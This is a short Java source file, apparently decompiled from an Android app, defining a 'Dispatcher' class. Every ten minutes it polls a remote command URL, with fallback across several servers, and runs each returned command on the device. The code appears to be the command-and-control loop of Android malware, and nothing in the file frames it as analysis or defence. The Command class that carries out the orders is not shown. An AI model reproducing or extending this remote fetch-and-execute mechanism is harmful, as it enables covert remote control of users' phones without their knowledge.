package sx.jolly.core;

import android.content.Context;
import android.os.Handler;
import java.util.List;
import java.util.TimerTask;
import sx.jolly.utils.Get;
import sx.jolly.utils.Url;
import sx.jolly.utils.Utils;

public class Dispatcher {
    /* access modifiers changed from: private */
    public Context context = null;
    Handler handler = null;
    String[] movies = null;
    private JollyTimer timer = null;

    private JollyTimer getTimer() {
        return this.timer;
    }

    private void setTimer(JollyTimer timer) {
        this.timer = timer;
    }

    public Dispatcher(Context context) {
        this.context = context;
        setTimer(new JollyTimer());
        startServiceTimer();
    }

    public void startServiceTimer() {
        Utils.slog(Dispatcher.class, "service started. timer started");
        getTimer().schedule(new TimerTask() {
            public void run() {
                List<String> resp = new Get(new Url(Utils.CMD_COMMAND, true, false, Dispatcher.this.context), Dispatcher.this.context).get();
                if (resp == null) {
                    Utils.slog(Dispatcher.class, "3 servers are switched off");
                } else if (resp.size() != 0) {
                    for (String cmd : resp) {
                        new Command(Dispatcher.this.context, new SingleCommand(cmd)).execute();
                    }
                }
            }
        }, 0, 600000);
    }
}
